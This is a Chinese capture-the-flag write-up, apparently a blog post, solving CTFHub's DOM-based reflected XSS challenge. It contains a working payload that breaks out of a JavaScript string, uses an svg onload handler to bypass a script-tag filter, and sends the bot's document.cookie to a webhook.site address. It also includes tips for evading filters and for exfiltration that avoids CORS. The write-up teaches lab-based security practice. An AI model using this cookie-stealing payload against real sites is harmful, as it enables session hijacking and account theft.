---
title: CTFHub XSS DOM反射 
date: 2026-10-09
categories: CTFHub Web
tags：CTFHub Web XSS DOM
---

# 题目:  CTFHub XSS DOM反射 
 
## 题目描述
 DOM型XSS，页面提供输入框 Change text ，输入内容后页面会把输入渲染到页面，存在DOM XSS漏洞。目标：获取Bot的Cookie，拿到flag。
 
## 解题思路
DOM XSS的特点：漏洞在前端JS，数据不经过后端存储，直接在浏览器渲染执行。
1. 页面JS使用单引号拼接字符串，我们可以用  ');  闭合原有JS字符串。
2. 闭合之后，注入可执行HTML标签。
3. 尝试 <script> 发现被过滤，改用 <svg onload> 事件执行JS，绕过过滤。
4. 执行 new Image() 构造GET请求，把 document.cookie 携带到webhook.site接收cookie。
5. 把构造好的链接提交给Bot访问，Bot浏览器执行XSS，带回cookie，获取flag。
 
## 解题步骤
1. 在靶场上方 Change text 输入框，注入payload：
');</script><svg onload='new Image().src="https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c="+document.cookie'>
2. 点击 Submit 提交，页面刷新，浏览器地址栏生成编码后的完整URL。
3. 复制地址栏完整URL，粘贴到下方 Send URL to Bot 输入框，点击Send。
4. Bot访问链接，页面渲染 <svg> 标签，加载完成触发 onload 。
5. JS执行，读取Bot的cookie，发起GET请求携带cookie到webhook。
6. 在webhook收件箱查看请求，拿到cookie中的flag。
 
## 踩坑指南
1. ❌ 直接手写 ?text=xxx 发给Bot：参数编码问题，上下文异常，脚本执行失败。
   ✅ 必须先在页面输入框Submit，复制地址栏自动生成的URL再丢Bot。
2. ❌  <script> 标签被靶场黑名单过滤，直接删除，无法执行。
   ✅ 改用svg、img、iframe的事件处理器（onload/onerror）绕过。
3. ❌ webhook.site免费版Custom Action的Modify Response不稳定，远程加载JS方案容易失效。
   ✅ 优先使用事件标签内联JS，不需要webhook配置，成功率更高。
4. ❌ fetch部分场景会触发跨域限制， new Image() 图片请求不会触发CORS，更适合外带数据。
 
## 知识点总结
1. DOM-XSS：用户输入直接参与前端JS代码执行，不需要后端返回恶意代码，属于前端漏洞。
2. 字符串闭合：页面JS使用单引号 ' ，payload用 '); 闭合原有语句，注入新代码。
3. XSS标签绕过：script被过滤时，利用 onload / onerror 事件触发JS。
4. 数据外带： new Image().src  构造GET请求外带Cookie，不受CORS跨域限制。
5. 靶场Bot机制：CTFHub的Bot是一个独立浏览器环境，用来访问你提交的链接，页面JS会在Bot的浏览器中执行，读取Bot的Cookie。
 
 
 
